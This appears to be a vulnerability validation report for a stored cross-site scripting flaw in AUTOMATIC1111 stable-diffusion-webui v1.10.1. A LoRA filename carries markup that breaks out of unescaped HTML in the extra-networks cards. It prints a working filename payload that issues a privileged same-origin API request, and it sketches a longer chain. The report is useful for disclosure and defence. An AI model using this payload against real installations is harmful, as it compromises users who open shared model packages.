# a1111.extra_networks_filename_xss — end-to-end validation

**Product:** AUTOMATIC1111/stable-diffusion-webui **v1.10.1**,
`82a973c04367123ae98bd9abdf80d9eda9b910e2`.
Source-tree digest verified in-container: `efbfdbe81a316f2e0758da403e8bb3e24dcd85c560bf369943372df936244905`.
**Host:** `.37` · **Image:** `mbe2e/v/a1111.extra_networks_filename_xss:r1` on
`mbe2e/prod:a1111-82a973c0-browser` · **Run time network:** `--network none`.

## Attacker capability

The **name** of one file inside a shared model package. Nothing else. On Linux
and macOS every byte except `/` and NUL is legal in a path component, so a LoRA
archive can carry markup in its filename:

```
x"><img src=x onerror='var s=String.fromCharCode(47);
fetch(s+"sdapi"+s+"v1"+s+"refresh-checkpoints",{method:"POST"})
.then(r=>document.documentElement.dataset.mbe2e="W"+r.status)'>.safetensors
```

191 bytes. The tensor payload inside is an ordinary, valid safetensors file
written by the official writer — only the name is hostile.

## Victim action

Start the WebUI and open `http://127.0.0.1:7860/`. The card HTML for every
registered extra-networks page is produced by `interface.load`
(`modules/ui_extra_networks.py:788`), so no click is required.

## The delegation

| step | code | what the value is treated as |
|---|---|---|
| 1 | `shared.walk_files` over the LoRA directory | a path on disk |
| 2 | `modules/ui_extra_networks.py:273` `btn_copy_path_tpl.format(filename=item["filename"])` | **HTML, unescaped** |
| 3 | `html/extra-networks-copy-path-button.html:3` `data-clipboard-text="{filename}"` | an attribute value it breaks out of |
| 4 | `javascript/extraNetworks.js` card `innerHTML` | parsed markup; `onerror` runs |

The contrast is the point: on the same card, `sort_keys` (`:306`) and
`description` (`:328`) both go through `html.escape`. The filename does not.

**Second sink, same value.** `search_terms_from_path(filename)` puts the same
string into `search_terms`, which is interpolated unescaped at
`modules/ui_extra_networks.py:312-320`. This artifact therefore hits two
unescaped sinks at once, and the canary does not distinguish which one fired.

## Observed run

```
negative  dom_markers: []                      (benign_lora.safetensors, identical tensors)
positive  dom_markers: ["W200"]                (the product answered the page's POST with 200)
privileged_same_origin_api_effect: true
rerun_identical: 1     duration: 342 s (build + two runs)
```

`exp/logs/run1/browser_trace.zip` is the Playwright trace.

## Verification boundary — what is NOT proven

- **No OS-level code execution is claimed here.** A1111's custom-code script is
  gated behind `--allow-code` and was not used.
- **The 255-byte path-component limit is a real constraint.** A payload that
  rewrites settings via `POST /sdapi/v1/options` measures 287 bytes and does not
  fit in a filename. The demonstrated privileged effect is therefore a body-less
  POST the product accepted, not a persistent state change. A longer chain would
  need a same-origin bootstrap (for example fetching the model file back through
  `/file=` and running a longer script out of its metadata); that was not
  attempted here.
- **Windows forbids the quote characters in filenames**, so this root applies to
  Linux/macOS and to archives unpacked on Unix.
- `--skip-load-model-at-start` and the stock `lora_show_all` setting are used so
  that no checkpoint is needed; neither touches the taint path.
